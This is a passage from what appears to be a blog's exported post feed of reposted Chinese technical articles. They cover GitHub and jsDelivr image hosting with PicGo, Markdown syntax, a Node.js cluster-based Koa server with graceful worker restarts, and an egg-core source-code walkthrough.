    <url>%2F2020%2F02%2F18%2F%E5%85%B6%E4%BB%96%2FGithub%2BjsDelivr%2BPicGo%20%E6%89%93%E9%80%A0%E7%A8%B3%E5%AE%9A%E5%BF%AB%E9%80%9F%E3%80%81%E9%AB%98%E6%95%88%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A%2F</url>
    <content type="text"><![CDATA[转载自知乎网络，原文链接：https://zhuanlan.zhihu.com/p/76947034 ● 前言图床是个啥东西就不用过多介绍了，先来对比一下各路图床： 微博图床：以前用的人比较多，从2019年4月开始开启了防盗链，凉凉 SM.MS：运营四年多了，也变得越来越慢了，到了晚上直接打不开图片，速度堪忧 其他小众图床：随时有挂掉的风险 Imgur等国外图床：国内访问速度太慢，随时有被墙的风险 大厂储存服务：例如七牛云、又拍云、腾讯云COS、阿里云OSS等，操作繁琐，又是实名认证又是域名备案的，麻烦，而且还要花钱（有钱又不怕麻烦的当我没说） 因此，GitHub图床是个不错的选择，利用jsDelivr CDN加速访问（jsDelivr 是一个免费开源的 CDN 解决方案），PicGo工具一键上传，操作简单高效，GitHub和jsDelivr都是大厂，不用担心跑路问题，不用担心速度和容量问题，而且完全免费，可以说是目前免费图床的最佳解决方案！ ● 新建GitHub仓库登录/注册GitHub，新建一个仓库，填写好仓库名，仓库描述，根据需求选择是否为仓库初始化一个README.md描述文件 ● 生成一个Token在主页依次选择【Settings】-【Developer settings】-【Personal access tokens】-【Generate new token】，填写好描述，勾选【repo】，然后点击【Generate token】生成一个Token，注意这个Token只会显示一次，自己先保存下来，或者等后面配置好PicGo后再关闭此网页 ● 配置PicGo前往下载PicGo，安装好后开始配置图床 设定仓库名：按照【用户名/图床仓库名】的格式填写 设定分支名：【master】 设定Token：粘贴之前生成的【Token】 指定存储路径：填写想要储存的路径，如【ITRHX-PIC/】，这样就会在仓库下创建一个名为ITRHX-PIC的文件夹，图片将会储存在此文件夹中 设定自定义域名：它的的作用是，在图片上传后，PicGo会按照【自定义域名+上传的图片名】的方式生成访问链接，放到粘贴板上，因为我们要使用jsDelivr加速访问，所以可以设置为【https://cdn.jsdelivr.net/gh/用户名/图床仓库名 】，关于jsDelivr是如何引用资源的可以参考《免费CDN：jsDeliver+Github》 ● 进行高效创作配置好PicGo后，我们就可以进行高效创作了，将图片拖拽到上传区，将会自动上传并复制访问链接，将链接粘贴到博文中就行了，访问速度杠杠的，此外PicGo还有相册功能，可以对已上传的图片进行删除，修改链接等快捷操作，PicGo还可以生成不同格式的链接、支持批量上传、快捷键上传、自定义链接格式、上传前重命名等，更多功能自己去探索吧！]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown 指南]]></title>
    <url>%2F2020%2F02%2F18%2F%E5%85%B6%E4%BB%96%2FMarkdown%20%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[Markdown是一套简洁可读性极好的标记语言，非常适合用来写作。本文只列出了大概语法，更详细的文档可以参考： http://daringfireball.net/projects/markdown/syntax https://help.github.com/articles/github-flavored-markdown http://jianshu.io/p/q81RER 标题1234567# 一级标题## 二级标题……###### 六级标题 引用1&gt; A man who stands for nothing will fall for anything. 文字加粗、斜体、删除（GFM）123456&lt;strong&gt;bold&lt;/strong&gt; text, __bold__ text*italic* text, _italic_ text~~deleted text~~注：行内使用时符号前需添加空格，如 &lt;strong&gt;这样一个&lt;/strong&gt; 例子 链接1[this is a link](http://name.com) 图片1234![](http://name.com/pic.jpg)Chrome下支持直接旺旺截图粘贴到编辑器里。![screenshot](http://name.com/pic.jpg) 视频注意：\1. 视频地址请使用https协议开头，否则会因为安全问题导致无法播放。\2. 请使用mp4/ogv等格式的视频，不要使用swf格式。 先把视频上传，然后替换代码中的src=””里的mp4地址。 1&lt;video width="100%" height="560" controls="controls" src="//cloud.video.taobao.com//play/u/1573424185/p/1/e/6/t/1/50078178824.mp4"&gt;&lt;/video&gt; 如果要 自动播放 ，采用如下代码： 1&lt;video width="100%" height="560" controls="controls" autoplay="autoplay" src="//cloud.video.taobao.com//play/u/1573424185/p/1/e/6/t/1/50078178824.mp4"&gt;&lt;/video&gt; 如果要调整视频的高度和宽度，请调整代码里的height和width属性 列表12345- item1- item21. item12. item2 表格（GFM）123| foo | bar || --- | --- || yep | nop | 代码1`console.log(1)` 代码块（GFM）（支持语法高亮）12345​```jsfunction fn() &#123; alert(2)&#125;​ 12## Latex公式 $$ x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} $$或： \[ x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} \] 行内公式： $ x=\frac{-b\pm\sqrt{b^2-4ac}}{2a} $或者： \( x=\frac{-b\pm\sqrt{b^2-4ac}}{2a} \)或者： \$ x=\frac{-b\pm\sqrt{b^2-4ac}}{2a} \$``` x=−b±√b2−4ac2ax=−b±b2−4ac2a行内公式：$ x=\frac{-b\pm\sqrt{b^2-4ac}}{2a} $ 相关文章 markdown 基础语法]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何创建一个可靠稳定的Web服务器]]></title>
    <url>%2F2020%2F02%2F14%2FNode.js%2F%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8F%AF%E9%9D%A0%E7%A8%B3%E5%AE%9A%E7%9A%84Web%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://juejin.im/post/5c0cf55c51882530544f22e2 本篇文章主要讲述的是如何通过Node创建一个稳定的web服务器，如果你看到这里想起了pm2等工具，那么你可以先抛弃pm2，进来看看，如果有哪些不合适的地方，恳请您指出。 创建一个稳定的web服务器需要解决什么问题。 如何利用多核CPU资源。 多个工作进程的存活状态管理。 工作进程的平滑重启。 进程错误处理。 工作进程限量重启。 如何利用多核CPU资源利用多核CPU资源有多种解决办法。 通过在单机上部署多个Node服务，然后监听不同端口，通过一台Nginx负载均衡。 这种做法一般用于多台机器，在服务器集群时，采用这种做法，这里我们不采用。 通过单机启动一个master进程，然后fork多个子进程，master进程发送句柄给子进程后，关闭监听端口，让子进程来处理请求。 这种做法也是Node单机集群普遍的做法。 所幸的是，Node在v0.8版本新增的cluster模块，让我们不必使用child_process一步一步的去处理Node集群这么多细节。 所以本篇文章讲述的是基于cluster模块解决上述的问题。 首先创建一个Web服务器，Node端采用的是Koa框架。没有使用过的可以先去看下 ===&gt; 传送门 下面的代码是创建一个基本的web服务需要的配置，看过上篇文章的可以先直接过滤这块代码，直接看后面。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798const Koa = require(&apos;koa&apos;);const app = new Koa();const koaNunjucks = require(&apos;koa-nunjucks-2&apos;);const koaStatic = require(&apos;koa-static&apos;);const KoaRouter = require(&apos;koa-router&apos;);const router = new KoaRouter();const path = require(&apos;path&apos;);const colors = require(&apos;colors&apos;);const compress = require(&apos;koa-compress&apos;);const AngelLogger = require(&apos;../angel-logger&apos;)const cluster = require(&apos;cluster&apos;);const http = require(&apos;http&apos;);class AngelConfig &#123; constructor(options) &#123; this.config = require(options.configUrl); this.app = app; this.router = require(options.routerUrl); this.setDefaultConfig(); this.setServerConfig(); &#125; setDefaultConfig() &#123; //静态文件根目录 this.config.root = this.config.root ? this.config.root : path.join(process.cwd(), &apos;app/static&apos;); //默认静态配置 this.config.static = this.config.static ? this.config.static : &#123;&#125;; &#125; setServerConfig() &#123; this.port = this.config.listen.port; //cookie签名验证 this.app.keys = this.config.keys ? this.config.keys : this.app.keys; &#125;&#125;//启动服务器class AngelServer extends AngelConfig &#123; constructor(options) &#123; super(options); this.startService(); &#125; startService() &#123; //开启gzip压缩 this.app.use(compress(this.config.compress)); //模板语法 this.app.use(koaNunjucks(&#123; ext: &apos;html&apos;, path: path.join(process.cwd(), &apos;app/views&apos;), nunjucksConfig: &#123; trimBlocks: true &#125; &#125;)); this.app.use(async (ctx, next) =&gt; &#123; ctx.logger = new AngelLogger().logger; await next(); &#125;) //访问日志 this.app.use(async (ctx, next) =&gt; &#123; await next(); // console.log(ctx.logger,&apos;loggerloggerlogger&apos;); const rt = ctx.response.get(&apos;X-Response-Time&apos;); ctx.logger.info(`angel $&#123;ctx.method&#125;`.green,` $&#123;ctx.url&#125; - `,`$&#123;rt&#125;`.green); &#125;); // 响应时间 this.app.use(async (ctx, next) =&gt; &#123; const start = Date.now(); await next(); const ms = Date.now() - start; ctx.set(&apos;X-Response-Time&apos;, `$&#123;ms&#125;ms`); &#125;); this.app.use(router.routes()) .use(router.allowedMethods()); // 静态资源 this.app.use(koaStatic(this.config.root, this.config.static)); // 启动服务器 this.server = this.app.listen(this.port, () =&gt; &#123; console.log(`当前服务器已经启动,请访问`,`http://127.0.0.1:$&#123;this.port&#125;`.green); this.router(&#123; router, config: this.config, app: this.app &#125;); &#125;); &#125;&#125;module.exports = AngelServer; 在启动服务器之后，将this.app.listen赋值给this.server，后面会用到。 一般我们做单机集群时，我们fork的进程数量是机器的CPU数量。当然更多也不限定，只是一般不推荐。 12345678910111213141516171819202122232425262728293031323334353637const cluster = require(&apos;cluster&apos;);const &#123; cpus &#125; = require(&apos;os&apos;); const AngelServer = require(&apos;../server/index.js&apos;);const path = require(&apos;path&apos;);let cpusNum = cpus().length;//超时let timeout = null;//重启次数let limit = 10;// 时间let during = 60000;let restart = [];//master进程if(cluster.isMaster) &#123; //fork多个工作进程 for(let i = 0; i &lt; cpusNum; i++) &#123; creatServer(); &#125;&#125; else &#123; //worker进程 let angelServer = new AngelServer(&#123; routerUrl: path.join(process.cwd(), &apos;app/router.js&apos;),//路由地址 configUrl: path.join(process.cwd(), &apos;config/config.default.js&apos;) //默认读取config/config.default.js &#125;);&#125;// master.js//创建服务进程 function creatServer() &#123; let worker = cluster.fork(); console.log(`工作进程已经重启pid: $&#123;worker.process.pid&#125;`);&#125; 使用进程的方式，其实就是通过cluster.isMaster和cluster.isWorker来进行判断的。 主从进程代码写在一块可能也不太好理解。这种写法也是Node官方的写法，当然也有更加清晰的写法，借助cluster.setupMaster实现，这里不去详细解释。 通过Node执行代码，看看究竟发生了什么。 首先判断cluster.isMaster是否存在，然后循环调用createServer(),fork4个工作进程。打印工作进程pid。 cluster启动时，它会在内部启动TCP服务，在cluster.fork()子进程时，将这个TCP服务端socket的文件描述符发送给工作进程。如果工作进程中存在listen()监听网络端口的调用，它将拿到该文件的文件描述符，通过SO_REUSEADDR端口重用，从而实现多个子进程共享端口。 进程管理、平滑重启、和错误处理。一般来说，master进程比较稳定，工作进程并不是太稳定。 因为工作进程处理的是业务逻辑，因此，我们需要给工作进程添加自动重启的功能，也就是如果子进程因为业务中不可控的原因报错了，而且阻塞了，此时，我们应该停止该进程接收任何请求，然后优雅的关闭该工作进程。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//超时let timeout = null;//重启次数let limit = 10;// 时间let during = 60000;let restart = [];if(cluster.isMaster) &#123; //fork多个工作进程 for(let i = 0; i &lt; cpusNum; i++) &#123; creatServer(); &#125;&#125; else &#123; //worker let angelServer = new AngelServer(&#123; routerUrl: path.join(process.cwd(), &apos;app/router.js&apos;),//路由地址 configUrl: path.join(process.cwd(), &apos;config/config.default.js&apos;) //默认读取config/config.default.js &#125;); //服务器优雅退出 angelServer.app.on(&apos;error&apos;, err =&gt; &#123; //发送一个自杀信号 process.send(&#123; act: &apos;suicide&apos; &#125;); cluster.worker.disconnect(); angelServer.server.close(() =&gt; &#123; //所有已有连接断开后，退出进程 process.exit(1); &#125;); //5秒后退出进程 timeout = setTimeout(() =&gt; &#123; process.exit(1); &#125;,5000); &#125;);&#125;// master.js//创建服务进程 function creatServer() &#123; let worker = cluster.fork(); console.log(`工作进程已经重启pid: $&#123;worker.process.pid&#125;`); //监听message事件，监听自杀信号，如果有子进程发送自杀信号，则立即重启进程。 //平滑重启 重启在前，自杀在后。 worker.on(&apos;message&apos;, (msg) =&gt; &#123; //msg为自杀信号，则重启进程 if(msg.act == &apos;suicide&apos;) &#123; creatServer(); &#125; &#125;); //清理定时器。 worker.on(&apos;disconnect&apos;, () =&gt; &#123; clearTimeout(timeout); &#125;);&#125; 我们在实例化AngelServer后，得到angelServer，通过拿到angelServer.app拿到Koa的实例，从而监听Koa的error事件。 当监听到错误发生时，发送一个自杀信号process.send({ act: &#39;suicide&#39; })。 调用cluster.worker.disconnect()方法，调用此方法会关闭所有的server，并等待这些server的 ‘close’事件执行，然后关闭IPC管道。 调用angelServer.server.close()方法，当所有连接都关闭后，通往该工作进程的IPC管道将会关闭，允许工作进程优雅地死掉。 如果5s的时间还没有退出进程，此时，5s后将强制关闭该进程。 Koa的app.listen是http.createServer(app.callback()).listen();的语法糖，因此可以调用close方法。 worker监听message，如果是该信号，此时先重启新的进程。 同时监听disconnect事件，清理定时器。 正常来说，我们应该监听process的uncaughtException事件，如果 Javascript 未捕获的异常，沿着代码调用路径反向传递回事件循环，会触发 ‘uncaughtException’ 事件。 但是Koa已经在middleware外边加了tryCatch。因此在uncaughtException捕获不到。 在这里，还得特别感谢下大深海老哥，深夜里，在群里给我指点迷津。 限量重启通过自杀信号告知主进程可以使新连接总是有进程服务，但是依然还是有极端的情况。 工作进程不能无限制的被频繁重启。 因此在单位时间规定只能重启多少次，超过限制就触发giveup事件。 12345678910111213//检查启动次数是否太过频繁，超过一定次数，重新启动。function isRestartNum() &#123; //记录重启的时间 let time = Date.now(); let length = restart.push(time); if(length &gt; limit) &#123; //取出最后10个 restart = restart.slice(limit * -1); &#125; //1分钟重启的次数是否太过频繁 return restart.length &gt;= limit &amp;&amp; restart[restart.length - 1] - restart[0] &lt; during;&#125; 同时将createServer修改成 123456789101112131415161718192021222324// master.js//创建服务进程 function creatServer() &#123; //检查启动是否太过频繁 if(isRestartNum()) &#123; process.emit(&apos;giveup&apos;, length, during); return; &#125; let worker = cluster.fork(); console.log(`工作进程已经重启pid: $&#123;worker.process.pid&#125;`); //监听message事件，监听自杀信号，如果有子进程发送自杀信号，则立即重启进程。 //平滑重启 重启在前，自杀在后。 worker.on(&apos;message&apos;, (msg) =&gt; &#123; //msg为自杀信号，则重启进程 if(msg.act == &apos;suicide&apos;) &#123; creatServer(); &#125; &#125;); //清理定时器。 worker.on(&apos;disconnect&apos;, () =&gt; &#123; clearTimeout(timeout); &#125;);&#125; 更改负载均衡策略默认的是操作系统抢占式，就是在一堆工作进程中，闲着的进程对到来的请求进行争抢，谁抢到谁服务。 对于是否繁忙是由CPU和I/O决定的，但是影响抢占的是CPU。 对于不同的业务，会有的I/O繁忙，但CPU空闲的情况，这时会造成负载不均衡的情况。因此我们使用node的另一种策略，名为轮叫制度。 1cluster.schedulingPolicy = cluster.SCHED_RR; 最后当然创建一个稳定的web服务还需要注意很多地方，比如优化处理进程之间的通信，数据共享等等。 本片文章只是给大家一个参考，如果有哪些地方写的不合适的地方，恳请您指出。 完整代码请见 Github。 参考资料：深入浅出nodejs]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Egg 源码分析之 egg-core（二）]]></title>
    <url>%2F2020%2F02%2F14%2FNode.js%2FEgg%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%20egg-core%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[转载自知乎网络，原文链接：https://zhuanlan.zhihu.com/p/47180589 loadService 函数如何在 Egg 框架中使用 serviceloadService 函数的实现是所有load函数中最复杂的一个，我们不着急看源码，先看一下 service 在 Egg 框架中如何使用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// egg-core 源码 -&gt; 如何在 egg 框架中使用 service//方式 1 ：app/service/user1.js//这个是最标准的做法，导出一个 class ，这个 class 继承了 require('egg').Service ，其实也就是我们上文提到的 eggCore 导出的 BaseContextClass//最终我们在业务逻辑中获取到的是这个class的一个实例，在 load 的时候是将 app.context 当作新建实例的参数//在 controller 中调用方式：this.ctx.service.user1.find(1)const Service = require('egg').Service;class UserService extends Service &#123; async find(uid) &#123; //此时我们可以通过 this.ctx,this.app,this.config,this.service 获取到有用的信息，尤其是 this.ctx 非常重要，每个请求对应一个 ctx，我们可以查询到当前请求的所有信息 const user = await this.ctx.db.query('select * from user where uid = ?', uid); return user; &#125;&#125;module.exports = UserService;//方式 2 ：app/service/user2.js//这个做法是我模拟了一个 BaseContextClass，当然也就可以实现方法 1 的目的，但是不推荐class UserService &#123; constructor(ctx) &#123; this.ctx = ctx; this.app = ctx.app; this.config = ctx.app.config; this.service = ctx.service; &#125; async find(uid) &#123; const user = await this.ctx.db.query('select * from user where uid = ?', uid); return user; &#125;&#125;module.exports = UserService;//方式 3 ：app/service/user3.js// service 中也可以 export 函数，在 load 的时候会主动调用这个函数，把 appInfo 参数传入，最终获取到的是函数返回结果//在 controller 中调用方式：this.ctx.service.user3.getAppName(1) ，这个时候在 service 中获取不到当前请求的上下文 ctxmodule.exports = (appInfo) =&gt; &#123; return &#123; async getAppName(uid)&#123; return appInfo.name; &#125; &#125;&#125;;//方式 4 ：app/service/user4.js// service 也可以直接 export 普通的原生对象，load 的时候会将该普通对象返回，同样获取不到当前请求的上下文 ctx//在 controller 中调用方式：this.ctx.service.user4.getAppName(1)module.exports = &#123; async getAppName(uid)&#123; return appInfo.name; &#125;&#125;; 我们上面列举了 service 下的 js 文件的四种写法，都是从每次请求的上下文 this.ctx 获取到 service 对象，然后就可以使用到每个 service 文件导出的对象了，这里主要有两个地方需要注意： 为什么我们可以从每个请求的 this.ctx 上获取到 service 对象呢：看过 Koa 源码的同学知道，this.ctx 其实是从 app.context 继承而来，所以我们只要把 service 绑定到 app.context 上，那么当前请求的上下文 ctx 自然可以拿到 service 对象，EggLoader 也是这样做的 针对上述四种使用场景，具体导出实例是怎么处理的呢？ 如果导出的是一个类，EggLoader 会主动以 ctx 对象去初始化这个实例并导出，所以我们就可以直接在该类中使用 this.ctx 获取当前请求的上下文了 如果导出的是一个函数，那么 EggLoader 会以 app 作为参数运行这个函数并将结果导出 如果是一个普通的对象，直接导出 FileLoader 类的实现分析在实现 loadService 函数时，有一个基础类就是 FileLoader ，它同时也是 loadMiddleware，loadController 实现的基础，这个类提供一个 load 函数根据目录结构和文件内容进行解析，返回一个 target 对象，我们可以根据文件名以及子文件名以及函数名称获取到 service 里导出的内容，target 结构类似这样： 12345678910&#123; "file1": &#123; "file11": &#123; "function1": a =&gt; a &#125; &#125;, "file2": &#123; "function2": a =&gt; a &#125;&#125; 下面我们先看一下 FileLoader 这个类的实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394// egg-core 源码 -&gt; FileLoader 实现class FileLoader &#123; constructor(options) &#123; /* options 里几个重要参数的含义: 1. directory: 需要加载文件的所有目录 2. target: 最终加载成功后的目标对象 3. initializer：一个初始化函数，对文件导出内容进行初始化，这个在 loadController 实现时会用到 4. inject：如果某个文件的导出对象是一个函数，那么将该值传入函数并执行导出，一般都是 this.app */ this.options = Object.assign(&#123;&#125;, defaults, options); &#125; load() &#123; //解析 directory 下的文件，下面有 parse 函数的部分实现 const items = this.parse(); const target = this.options.target; // item1 = &#123; properties: [ 'a', 'b', 'c'], exports1 &#125;,item2 = &#123; properties: [ 'a', 'b', 'd'], exports2 &#125; // =&gt; target = &#123;a: &#123;b: &#123;c: exports1, d: exports2&#125;&#125;&#125; //根据文件路径名称递归生成一个大的对象 target ，我们通过 target.file1.file2 就可以获取到对应的导出内容 for (const item of items) &#123; item.properties.reduce((target, property, index) =&gt; &#123; let obj; const properties = item.properties.slice(0, index + 1).join('.'); if (index === item.properties.length - 1) &#123; obj = item.exports; if (obj &amp;&amp; !is.primitive(obj)) &#123; //这步骤很重要，确定这个 target 是不是一个 exports ，有可能只是一个路径而已 obj[FULLPATH] = item.fullpath; obj[EXPORTS] = true; &#125; &#125; else &#123; obj = target[property] || &#123;&#125;; &#125; target[property] = obj; return obj; &#125;, target); &#125; return target; &#125; //最终生成 [&#123; properties: [ 'a', 'b', 'c'], exports，fullpath&#125;] 形式， properties 文件路径名称的数组， exports 是导出对象， fullpath 是文件的绝对路径 parse() &#123; //文件目录转换为数组 let directories = this.options.directory; if (!Array.isArray(directories)) &#123; directories = [ directories ]; &#125; //遍历所有文件路径 const items = []; for (const directory of directories) &#123; //每个文件目录下面可能还会有子文件夹，所以 globby.sync 函数是获取所有文件包括子文件下的文件的路径 const filepaths = globby.sync(files, &#123; cwd: directory &#125;); for (const filepath of filepaths) &#123; const fullpath = path.join(directory, filepath); if (!fs.statSync(fullpath).isFile()) continue; //获取文件路径上的以 "/" 分割的所有文件名，foo/bar.js =&gt; [ 'foo', 'bar' ]，这个函数会对 propertie 同一格式，默认为驼峰 const properties = getProperties(filepath, this.options); // app/service/foo/bar.js =&gt; service.foo.bar const pathName = directory.split(/[/\\]/).slice(-1) + '.' + properties.join('.'); // getExports 函数获取文件内容，并将结果做一些处理，看下面实现 const exports = getExports(fullpath, this.options, pathName); //如果导出的是 class ，会设置一些属性，这个属性下文中对于 class 的特殊处理地方会用到 if (is.class(exports)) &#123; exports.prototype.pathName = pathName; exports.prototype.fullPath = fullpath; &#125; items.push(&#123; fullpath, properties, exports &#125;); &#125; &#125; return items; &#125;&#125;//根据指定路径获取导出对象并作预处理function getExports(fullpath, &#123; initializer, call, inject &#125;, pathName) &#123; let exports = utils.loadFile(fullpath); //用 initializer 函数对exports结果做预处理 if (initializer) &#123; exports = initializer(exports, &#123; path: fullpath, pathName &#125;); &#125; //如果 exports 是 class，generatorFunction，asyncFunction 则直接返回 if (is.class(exports) || is.generatorFunction(exports) || is.asyncFunction(exports)) &#123; return exports; &#125; //如果导出的是一个普通函数，并且设置了 call=true，默认是 true，会将 inject 传入并调用该函数，上文中提到过好几次，就是在这里实现的 if (call &amp;&amp; is.function(exports)) &#123; exports = exports(inject); if (exports != null) &#123; return exports; &#125; &#125; //其它情况直接返回 return exports;&#125; ContextLoader 类的实现分析上文中说到 loadService 函数其实最终把 service 对象挂载在了 app.context 上，所以为此提供了 ContextLoader 这个类，继承了 FileLoader 类，用于将 FileLoader 解析出来的 target 挂载在 app.context 上，下面是其实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// egg-core -&gt; ContextLoader 类的源码实现class ContextLoader extends FileLoader &#123; constructor(options) &#123; const target = options.target = &#123;&#125;; super(options); // FileLoader 已经讲过 inject 就是 app const app = this.options.inject; // property 就是要挂载的属性，比如 "service" const property = options.property; //将 service 属性挂载在 app.context 上 Object.defineProperty(app.context, property, &#123; get() &#123; //做缓存，由于不同的请求 ctx 不一样，这里是针对同一个请求的内容进行缓存 if (!this[CLASSLOADER]) &#123; this[CLASSLOADER] = new Map(); &#125; const classLoader = this[CLASSLOADER]; //获取导出实例，这里就是上文用例中获取 this.ctx.service.file1.fun1 的实现，这里的实例就是 this.ctx.service，实现逻辑请看下面的 getInstance 的实现 let instance = classLoader.get(property); if (!instance) &#123; //这里传入的 this 就是为了初始化 require('egg').Service 实例时当作参数传入 // this 会根据调用者的不同而改变，比如是 app.context 的实例调用那么就是 app.context ，如果是 app.context 子类的实例调用，那么就是其子类的实例 //就是因为这个 this ，如果 service 里继承require('egg').Service ，才可以通过 this.ctx 获取到当前请求的上下文 instance = getInstance(target, this); classLoader.set(property, instance); &#125; return instance; &#125;, &#125;); &#125;&#125;// values 是 FileLoader/load 函数生成 target 对象function getInstance(values, ctx) &#123; //上文 FileLoader 里实现中我们讲过，target 对象是一个由路径和 exports 组装成的一个大对象，这里 Class 是为了确定其是不是一个 exports ，有可能是一个路径名 const Class = values[EXPORTS] ? values : null; let instance; if (Class) &#123; if (is.class(Class)) &#123; //这一步很重要，如果是类，就用 ctx 进行初始化获取实例 instance = new Class(ctx); &#125; else &#123; //普通对象直接导出，这里要注意的是如果是 exports 函数，在 FileLoader 实现中已经将其执行并转换为了对象 // function 和 class 分别在子类和父类的处理的原因是， function 的处理逻辑 loadMiddleware,loadService,loadController 公用，而 class 的处理逻辑 loadService 使用 instance = Class; &#125; &#125; else if (is.primitive(values)) &#123; //原生类型直接导出 instance = values; &#125; else &#123; //如果目前的 target 部分是一个路径，那么会新建一个 ClassLoader 实例，这个 ClassLoader 中又会递归的调用 getInstance //这里之所以新建一个类，一是为了做缓存，二是为了在每个节点获取到的都是一个类的实例 instance = new ClassLoader(&#123; ctx, properties: values &#125;); &#125; return instance;&#125; loadService 的实现有了 ContextLoader 类，那实现 loadService 函数就非常容易了，如下： 123456789101112131415161718192021// egg-core -&gt; loadService 函数实现源码// loadService 函数调用 loadToContext 函数loadService(opt) &#123; opt = Object.assign(&#123; call: true, caseStyle: 'lower', fieldClass: 'serviceClasses', directory: this.getLoadUnits().map(unit =&gt; path.join(unit.path, 'app/service')), //所有加载单元目录下的 service &#125;, opt); const servicePaths = opt.directory; this.loadToContext(servicePaths, 'service', opt);&#125;// loadToContext 函数直接新建 ContextLoader 实例，调用 load 函数实现加载loadToContext(directory, property, opt) &#123; opt = Object.assign(&#123;&#125;, &#123; directory, property, inject: this.app, &#125;, opt); new ContextLoader(opt).load();&#125; loadMiddleware 函数中间件是 Koa 框架中很重要的一个环节，通过 app.use 引入中间件，使用洋葱圈模型，所以中间件加载的顺序很重要。 - 如果在上文中的 config 中配置的中间件，系统会自动用 app.use 函数使用该中间件 - 所有的中间件我们都可以在 app.middleware 中通过中间件 name 获取到，便于在业务中动态使用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// egg-core 源码 -&gt; loadMiddleware 函数实现源码loadMiddleware(opt) &#123; const app = this.app; opt = Object.assign(&#123; call: false, // call=false 表示如果中间件导出是函数，不会主动调用函数做转换 override: true, caseStyle: 'lower', directory: this.getLoadUnits().map(unit =&gt; join(unit.path, 'app/middleware')) //所有加载单元目录下的 middleware &#125;, opt); const middlewarePaths = opt.directory; //将所有中间件 middlewares 挂载在 app 上，这个函数在 loadController 实现中也用到了，看下文的实现 this.loadToApp(middlewarePaths, 'middlewares', opt); //将 app.middlewares 中的每个中间件重新绑定在 app.middleware 上，每个中间件的属性不可配置，不可枚举 for (const name in app.middlewares) &#123; Object.defineProperty(app.middleware, name, &#123; get() &#123; return app.middlewares[name]; &#125;, enumerable: false, configurable: false, &#125;); &#125; //只有在 config 中配置了 appMiddleware 和 coreMiddleware 才会直接在 app.use 中使用，其它中间件只是挂载在 app 上，开发人员可以动态使用 const middlewareNames = this.config.coreMiddleware.concat(this.config.appMiddleware); const middlewaresMap = new Map(); for (const name of middlewareNames) &#123; //如果 config 中定义 middleware 在 app.middlewares 中找不到或者重复定义，都会报错 if (!app.middlewares[name]) &#123; throw new TypeError(`Middleware $&#123;name&#125; not found`); &#125; if (middlewaresMap.has(name)) &#123; throw new TypeError(`Middleware $&#123;name&#125; redefined`); &#125; middlewaresMap.set(name, true); const options = this.config[name] || &#123;&#125;; let mw = app.middlewares[name]; //中间件的文件定义必须 exports 一个普通 function ，并且接受两个参数： // options: 中间件的配置项，框架会将 app.config[$&#123;middlewareName&#125;] 传递进来, app: 当前应用 Application 的实例 //执行 exports 的函数，生成最终要的中间件 mw = mw(options, app); mw._name = name; //包装中间件，最终转换成 async function(ctx, next) 形式 mw = wrapMiddleware(mw, options); if (mw) &#123; app.use(mw); this.options.logger.info('[egg:loader] Use middleware: %s', name); &#125; else &#123; this.options.logger.info('[egg:loader] Disable middleware: %s', name); &#125; &#125;&#125;//通过 FileLoader 实例加载指定属性的所有文件并导出，然后将该属性挂载在 app 上loadToApp(directory, property, opt) &#123; const target = this.app[property] = &#123;&#125;; opt = Object.assign(&#123;&#125;, &#123; directory, target, inject: this.app, &#125;, opt); new FileLoader(opt).load();&#125; loadController 函数controller 中生成的函数最终还是在 router.js 中当作一个中间件使用，所以我们需要将 controller 中内容转换为中间件形式 async function(ctx, next) ，其中 initializer 这个函数就是用来针对不同的情况将 controller 中的内容转换为中间件的，下面是 loadController 的实现逻辑： 1234567891011121314151617181920212223242526272829303132// egg-core源码 -&gt; loadController 函数实现源码loadController(opt) &#123; opt = Object.assign(&#123; caseStyle: 'lower', directory: path.join(this.options.baseDir, 'app/controller'), //这个配置，上文有提到，是为了对导出对象做预处理的函数 initializer: (obj, opt) =&gt; &#123; //如果是普通函数，依然直接调用它生成新的对象 if (is.function(obj) &amp;&amp; !is.generatorFunction(obj) &amp;&amp; !is.class(obj) &amp;&amp; !is.asyncFunction(obj)) &#123; obj = obj(this.app); &#125; if (is.class(obj)) &#123; obj.prototype.pathName = opt.pathName; obj.prototype.fullPath = opt.path; //如果是一个 class，class 中的函数转换成 async function(ctx, next) 中间件形式，并用 ctx 去初始化该 class ，所以在 controller 里我们也可以使用 this.ctx.xxx 形式 return wrapClass(obj); &#125; if (is.object(obj)) &#123; //如果是一个 Object ，会递归的将该 Object 中每个属性对应的函数转换成 async function(ctx, next) 中间件形式形式 return wrapObject(obj, opt.path); &#125; if (is.generatorFunction(obj) || is.asyncFunction(obj)) &#123; return wrapObject(&#123; 'module.exports': obj &#125;, opt.path)['module.exports']; &#125; return obj; &#125;, &#125;, opt); // loadController 函数同样是通过 loadToApp 函数将其导出对象挂载在 app 下，controller 里的内容在 loadRouter 时会将其载入 const controllerBase = opt.directory; this.loadToApp(controllerBase, 'controller', opt); &#125;, loadRouter 函数loadRouter 函数特别简单，只是 require 加载一下 app/router 目录下的文件而已，而所有的事情都交给了 EggCore 类上的 router 属性去实现 而 router 